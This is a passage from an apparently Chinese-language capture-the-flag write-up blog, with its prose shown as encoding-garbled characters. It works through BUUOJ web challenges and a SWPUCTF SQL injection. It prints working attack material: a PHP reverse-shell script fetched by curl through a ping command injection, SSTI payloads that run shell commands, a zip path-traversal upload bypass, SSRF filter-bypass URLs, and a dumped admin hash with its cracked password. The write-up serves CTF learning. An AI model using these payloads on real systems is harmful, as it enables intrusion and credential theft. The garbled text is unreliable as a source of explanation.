<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;).read() &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬äºŒç« -webè¿›é˜¶-æ­»äº¡pingå‘½ä»¤"><a href="#ç¬¬äºŒç« -webè¿›é˜¶-æ­»äº¡pingå‘½ä»¤" class="headerlink" title="[ç¬¬äºŒç«  webè¿›é˜¶]æ­»äº¡pingå‘½ä»¤"></a>[ç¬¬äºŒç«  webè¿›é˜¶]æ­»äº¡pingå‘½ä»¤</h1><p>è¿™ä¸ªé¢˜ç›®çš„pingèƒ½å¤Ÿå‡ºå¤–ç½‘ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ç”¨%0aå°†pingæ¢è¡Œç»•è¿‡</p>
<p>ä¹‹åcurl [ip]/xxx.php &gt;&gt;/tmp/xx</p>
<p>phpå¯ä»¥å†™ä¸€ä¸ªåå¼¹shellæ–‡ä»¶ï¼Œè¿™é‡Œæ¯”å¦‚æˆ‘ä»¬ç”¨Pç‰›çš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock = fsockopen(<span class="string">&quot;<span class="subst">$IP</span>&quot;</span>, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">&#x27;/bin/sh&#x27;</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæˆ‘ä»¬å†æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">%0aphp /tmp/xx </span><br></pre></td></tr></table></figure>

<p>å³å¯åå¼¹shell</p>
<h1 id="ç¬¬äºŒç« -webè¿›é˜¶-æ–‡ä»¶ä¸Šä¼ "><a href="#ç¬¬äºŒç« -webè¿›é˜¶-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="[ç¬¬äºŒç«  webè¿›é˜¶]æ–‡ä»¶ä¸Šä¼ "></a>[ç¬¬äºŒç«  webè¿›é˜¶]æ–‡ä»¶ä¸Šä¼ </h1><h2 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h2><h3 id="1-apacheè‡ªå¸¦çš„æ–‡ä»¶è§£ææ¼æ´"><a href="#1-apacheè‡ªå¸¦çš„æ–‡ä»¶è§£ææ¼æ´" class="headerlink" title="1.apacheè‡ªå¸¦çš„æ–‡ä»¶è§£ææ¼æ´"></a>1.apacheè‡ªå¸¦çš„æ–‡ä»¶è§£ææ¼æ´</h3><p>å¦‚æœapacheè¯»å–æ–‡ä»¶çš„æ—¶å€™ï¼Œåç¼€ä¸ºå…¶ä¸å¯è§£æçš„æ–‡ä»¶ååç¼€ï¼Œå°±ä¼šå‘ä¸Šè¿½æº¯ï¼Œä¾‹å¦‚æˆ‘ä»¬çš„apacheè§£æ</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">aaa.php.xxx</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºapacheæ— æ³•è§£æxxx,æ‰€ä»¥apacheå°±ä¼šè§£æå‰ä¸€ä¸ªï¼Œå°±æ˜¯aaa.phpäº†ã€ä½†æ˜¯æˆ‘ä»¬è®¿é—®çš„æ—¶å€™ä¾ç„¶ç”¨aaa.php.xxxå»è®¿é—®</p>
<h3 id="2-é€»è¾‘æ¼æ´"><a href="#2-é€»è¾‘æ¼æ´" class="headerlink" title="2.é€»è¾‘æ¼æ´"></a>2.é€»è¾‘æ¼æ´</h3><p>é¢˜ç›®æ˜¯ç»™å‡ºæºä»£ç çš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">// æ¯5åˆ†é’Ÿä¼šæ¸…é™¤ä¸€æ¬¡ç›®å½•ä¸‹ä¸Šä¼ çš„æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;pclzip.lib.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_FILES)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;æ–‡ä»¶ä¸Šä¼ ç« èŠ‚ç»ƒä¹ é¢˜&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u&quot; crossorigin=&quot;anonymous&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;style type=&quot;text/css&quot;&gt;</span></span><br><span class="line"><span class="string">        .login-box&#123;</span></span><br><span class="line"><span class="string">            margin-top: 100px;</span></span><br><span class="line"><span class="string">            height: 500px;</span></span><br><span class="line"><span class="string">            border: 1px solid #000;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        body&#123;</span></span><br><span class="line"><span class="string">            background: white;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        .btn1&#123;</span></span><br><span class="line"><span class="string">            width: 200px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        .d1&#123;</span></span><br><span class="line"><span class="string">            display: block;</span></span><br><span class="line"><span class="string">            height: 400px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;login-box col-md-12&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;form class=&quot;form-horizontal&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;æ–‡ä»¶ä¸Šä¼ ç« èŠ‚ç»ƒä¹ é¢˜&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;hr /&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;form-group&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;label class=&quot;col-sm-2 control-label&quot;&gt;é€‰æ‹©æ–‡ä»¶ï¼š&lt;/label&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;input-group col-sm-10&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div &gt;</span></span><br><span class="line"><span class="string">                    &lt;label for=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;/label&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">        &lt;div class=&quot;col-sm-8  text-right&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; class=&quot;btn btn-success text-right btn1&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $file = $_FILES[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!$file)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;è¯·å‹¿ä¸Šä¼ ç©ºæ–‡ä»¶&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $name = $file[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">&#x27;upload/&#x27;</span>;</span><br><span class="line">    $ext = strtolower(substr(strrchr($name, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>));</span><br><span class="line">    $path = $dir.$name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_dir</span>(<span class="params">$dir</span>)</span>&#123;</span><br><span class="line">        $handle = opendir($dir);</span><br><span class="line">        <span class="keyword">while</span>(($f = readdir($handle)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!in_array($f, <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>)))&#123;</span><br><span class="line">                <span class="keyword">if</span>(is_dir($dir.$f))&#123;</span><br><span class="line">                    check_dir($dir.$f.<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">                 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    $ext = strtolower(substr(strrchr($f, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>));</span><br><span class="line">                    <span class="keyword">if</span>(!in_array($ext, <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>)))&#123;</span><br><span class="line">                        unlink($dir.$f);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!is_dir($dir))&#123;</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $temp_dir = $dir.md5(time(). rand(<span class="number">1000</span>,<span class="number">9999</span>));</span><br><span class="line">    <span class="keyword">if</span>(!is_dir($temp_dir))&#123;</span><br><span class="line">        mkdir($temp_dir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>)))&#123;</span><br><span class="line">        <span class="keyword">if</span>($ext == <span class="string">&#x27;zip&#x27;</span>)&#123;</span><br><span class="line">            $archive = <span class="keyword">new</span> PclZip($file[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">            <span class="keyword">foreach</span>($archive-&gt;listContent() <span class="keyword">as</span> $value)&#123;</span><br><span class="line">                $filename = $value[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.php$/&#x27;</span>, $filename))&#123;</span><br><span class="line">                     <span class="keyword">exit</span>(<span class="string">&quot;å‹ç¼©åŒ…å†…ä¸å…è®¸å«æœ‰phpæ–‡ä»¶!&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class="number">0</span>) &#123;</span><br><span class="line">                check_dir($dir);</span><br><span class="line">                   <span class="keyword">exit</span>(<span class="string">&quot;è§£å‹å¤±è´¥&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            check_dir($dir);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;ä¸Šä¼ æˆåŠŸ!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], $temp_dir.<span class="string">&#x27;/&#x27;</span>.$file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            check_dir($dir);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;ä¸Šä¼ æˆåŠŸ!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;ä»…å…è®¸ä¸Šä¼ zipã€jpgã€gifã€pngæ–‡ä»¶!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¸å¿ƒçš„ç‚¹åœ¨check_dirè¿™é‡Œï¼Œæˆ‘ä»¬ä¸Šä¸‹çœ‹ä¸€çœ¼å°±çŸ¥é“æˆ‘ä»¬æ˜¯ç™½åå•ä¸Šä¼ ï¼Œç»•è¿‡å°±åˆ«æƒ³äº†ï¼Œä½†æ˜¯ä»–å…è®¸æˆ‘ä»¬ä¸Šä¼ zipï¼Œè¿™æ ·çš„è¯å°±æœ‰æ“ä½œçš„ç©ºé—´äº†ã€‚æ³¨æ„è¿™ä¸ªå‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$archive = <span class="keyword">new</span> PclZip($file[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ¶‰åŠåˆ°äº†ä¸€ä¸ªtrickï¼Œè¯¥å‡½æ•°æ˜¯å­˜åœ¨ç›®å½•ç©¿è¶Šæ¼æ´çš„ï¼ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬çš„æ–‡ä»¶åä¸º../../xx.php.xx</p>
<p><strong>å°±ä¼šè¢«ä¸Šä¼ åˆ°å…¶ä»–ç›®å½•</strong>ï¼Œè¿™é‡Œä¿®æ”¹çš„è¯éœ€è¦åˆ©ç”¨010editoræ¥è¿›è¡Œæ“ä½œ</p>
<p>ä¹‹åæˆ‘ä»¬å¯ä»¥çœ‹è§ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($archive-&gt;listContent() <span class="keyword">as</span> $value)&#123;</span><br><span class="line">                $filename = $value[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.php$/&#x27;</span>, $filename))&#123;</span><br><span class="line">                     <span class="keyword">exit</span>(<span class="string">&quot;å‹ç¼©åŒ…å†…ä¸å…è®¸å«æœ‰phpæ–‡ä»¶!&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>é€»è¾‘æ˜¯å…ˆè§£å‹æ–‡ä»¶ï¼Œä¹‹åå†checkï¼Œä½†æ˜¯åˆ©ç”¨è¯¥æ¼æ´ï¼Œcheckçš„æ—¶å€™æ–‡ä»¶å·²ç»è¢«åˆ›å»ºåˆ°å…¶ä»–æ–‡ä»¶å¤¹å»äº†ï¼Œä¹Ÿå°±æ²¡åŠæ³•checkåˆ°äº†ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œç›´æ¥ä¸Šä¼ ä¸€ä¸ª../../xx.php.xxxå°±è¡Œäº†</p>
<h1 id="ç¬¬ä¸‰ç« -webè¿›é˜¶-SSTI"><a href="#ç¬¬ä¸‰ç« -webè¿›é˜¶-SSTI" class="headerlink" title="[ç¬¬ä¸‰ç«  webè¿›é˜¶]SSTI"></a>[ç¬¬ä¸‰ç«  webè¿›é˜¶]SSTI</h1><p>ç®€å•é¢˜ç›®ï¼Œç›´æ¥æ¢­å°±è¡Œäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5d5ec153-1957-45a2-bff1-fda588f70774.node3.buuoj.cn&#x2F;?password&#x3D;&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat app&#x2F;server.py&#39;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬ä¸‰ç« -webè¿›é˜¶-Pythoné‡Œçš„SSRF"><a href="#ç¬¬ä¸‰ç« -webè¿›é˜¶-Pythoné‡Œçš„SSRF" class="headerlink" title="[ç¬¬ä¸‰ç«  webè¿›é˜¶]Pythoné‡Œçš„SSRF"></a>[ç¬¬ä¸‰ç«  webè¿›é˜¶]Pythoné‡Œçš„SSRF</h1><p>çŸ¥è¯†ç‚¹ï¼š</p>
<p>å…³äºSSRFï¼Œå…¶å®æˆ‘ä¹Ÿæ‡‚å¾—ä¸å¤š..è¿™é“é¢˜é¢˜ç›®ç»™å‡ºæç¤ºè®©æˆ‘ä»¬è®¿é—®</p>
<p>8000 ç«¯å£å’Œ url path /api/internal/secret</p>
<p>è¿™é‡Œæ˜¯çœ‹è¿‡Pç‰›çš„æ–‡ç« ..</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leavesongs.com&#x2F;PYTHON&#x2F;defend-ssrf-vulnerable-in-python.html</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬æƒ³è¦ç»•è¿‡åªéœ€è¦æ„é€ ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95cf0d10-668e-49cc-a0ac-3982c091dd6d.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.233.233.233:8000&#x2F;api&#x2F;internal&#x2F;secret</span><br></pre></td></tr></table></figure>

<p>é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨linuxå½“ä¸­0.0.0.0ç­‰æ•ˆäº127.0.0.1</p>
<p>æ•…æˆ‘ä»¬å…¶å®ä¹Ÿå¯ä»¥æ„é€ ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95cf0d10-668e-49cc-a0ac-3982c091dd6d.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;0.0.0.0:8000&#x2F;api&#x2F;internal&#x2F;secret</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ï¼š</p>
<ol>
<li>åˆ©ç”¨å…«è¿›åˆ¶IPåœ°å€ç»•è¿‡</li>
<li>åˆ©ç”¨åå…­è¿›åˆ¶IPåœ°å€ç»•è¿‡</li>
<li>åˆ©ç”¨åè¿›åˆ¶çš„IPåœ°å€ç»•è¿‡</li>
<li>åˆ©ç”¨IPåœ°å€çš„çœç•¥å†™æ³•ç»•è¿‡</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">å››ç§å†™æ³•ï¼ˆ5ä¸ªä¾‹å­ï¼‰ï¼š012.0.0.1 ã€ 0xa.0.0.1 ã€ 167772161 ã€ 10.1 ã€ 0xA000001 å®é™…ä¸Šéƒ½è¯·æ±‚çš„æ˜¯10.0.0.1ï¼Œä½†ä»–ä»¬ä¸€ä¸ªéƒ½åŒ¹é…ä¸ä¸Šä¸Šè¿°æ­£åˆ™è¡¨è¾¾å¼ã€‚</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿˜æä¾›ä¸€äº›ssrfçš„æ€è·¯ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://233.233.233.233@10.0.0.1:8080/ã€http://10.0.0.1#233.233.233.233è¿™æ ·çš„URLï¼Œè®©åç«¯è®¤ä¸ºå…¶Hostæ˜¯233.233.233.233ï¼Œå®é™…ä¸Šè¯·æ±‚çš„å´æ˜¯10.0.0.1ã€‚è¿™ç§æ–¹æ³•åˆ©ç”¨çš„æ˜¯ç¨‹åºå‘˜å¯¹URLè§£æçš„é”™è¯¯</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰è¿™ä¹ˆä¸€ä¸ª[xipæœåŠ¡] <a href="http://xip.io/">http://xip.io</a></p>
<p>æš‚ä¸”æ€è€ƒåˆ°è¿™é‡Œï¼š</p>
<h1 id="ç¬¬äºŒç« -webè¿›é˜¶-SSRF-Training"><a href="#ç¬¬äºŒç« -webè¿›é˜¶-SSRF-Training" class="headerlink" title="[ç¬¬äºŒç«  webè¿›é˜¶]SSRF Training"></a>[ç¬¬äºŒç«  webè¿›é˜¶]SSRF Training</h1><p>å‘ƒï¼Œå°±å¾ˆå¥‡æ€ªï¼Ÿè¿™é“é¢˜çš„æ—¶å€™ï¼Œindex.phpæœåŠ¡ä¸‹çš„å®¹å™¨ï¼Œå¯ä»¥ç›´æ¥127.0.0.1/flag.phpå°±å†²è¿‡å»äº†</p>
<p><img src="image-20201204151421793.png" alt="image-20201204151421793"></p>
<p>ä½†æ˜¯è¿˜æœ‰ä¸ªchallenge.php,è¿™ä¸ªè¦éš¾ã€‚ç»™å‡ºæºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $match_result=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,$url);</span><br><span class="line">    <span class="keyword">if</span> (!$match_result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $url_parse=parse_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $hostname=$url_parse[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $ip=gethostbyname($hostname);</span><br><span class="line">    $int_ip=ip2long($ip);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $result_info = curl_getinfo($ch);</span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url($result_info[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        var_dump($output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span><br><span class="line">    safe_request_url($url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸»è¦trickåœ¨äºparse_urlå’Œcurlçš„è§£æä¼šå‡ºç°å·®å¼‚ï¼Œå½“æˆ‘ä»¬æ„é€ urlä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a@127.0.0.1:80@baidu.com</span><br></pre></td></tr></table></figure>

<p>parse_urlä¼šè§£æåè€…ï¼Œæ‹¿åˆ°æ‰‹ä¸Šçš„å°±æ˜¯<a href="http://baidu.com,è€Œcurlå®é™…ä¸Šå‘é€å‡ºå»çš„è¯·æ±‚ä¸º127.0.0.1/">http://baidu.com,è€Œcurlå®é™…ä¸Šå‘é€å‡ºå»çš„è¯·æ±‚ä¸º127.0.0.1:80</a></p>
<p>æ³¨æ„ä¸€äº›ï¼Œå¦‚æœä½ éœ€è¦è®¿é—®æŸä¸ªé¡µé¢ï¼Œä½ éœ€è¦æ·»åŠ çš„payloadåº”è¯¥æ˜¯ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?url=http://a@127.0.0.1:80@hacktest.com/flag.php</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>SWPUCTF</title>
    <url>/2020/12/06/SWPUCTF/</url>
    <content><![CDATA[<h1 id="ç¬¬ä¸€æ­¥"><a href="#ç¬¬ä¸€æ­¥" class="headerlink" title="ç¬¬ä¸€æ­¥"></a>ç¬¬ä¸€æ­¥</h1><p>é€šè¿‡æ‰«ç›®å½•èƒ½å¤Ÿå¾—åˆ°Index.php.bak,å¾—å‡ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">GET /important_index_its_so_long_right.php?id=1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªurlä¸‹é¢å¯ä»¥è¿›è¡Œæ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;182.150.46.187:8802&#x2F;important_index_its_so_long_right.php?id&#x3D;1</span><br></pre></td></tr></table></figure>

<p>æ‰«å‡ºæ¥å¯†ç ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">+----------------------------------+----------+------+</span><br><span class="line">| pwd                              | usn      | id   |</span><br><span class="line">+----------------------------------+----------+------+</span><br><span class="line">| f1097380e513e86f2c1548cc1094bf4e | admin123 | 1    |</span><br><span class="line">+----------------------------------+----------+------+</span><br></pre></td></tr></table></figure>

<p>somd5è§£å¯†å¯ä»¥å¾—å‡ºï¼šwllm@123ï¼Œè¿™ä¸ªå¯ä»¥ç™»é™†åå°ï¼Œh1ntæˆ‘ä»¬ä¹Ÿå¯ä»¥å»æ³¨å…¥å‡ºæ¥ä¸œè¥¿</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">+------+--------------------------------------+--------+</span><br><span class="line">| id   | hint                                 | user   |</span><br><span class="line">+------+--------------------------------------+--------+</span><br><span class="line">| 1    | last_index_come_on_swpu_ctf.php?id=4 | 00001  |</span><br><span class="line">+------+--------------------------------------+--------+</span><br></pre></td></tr></table></figure>

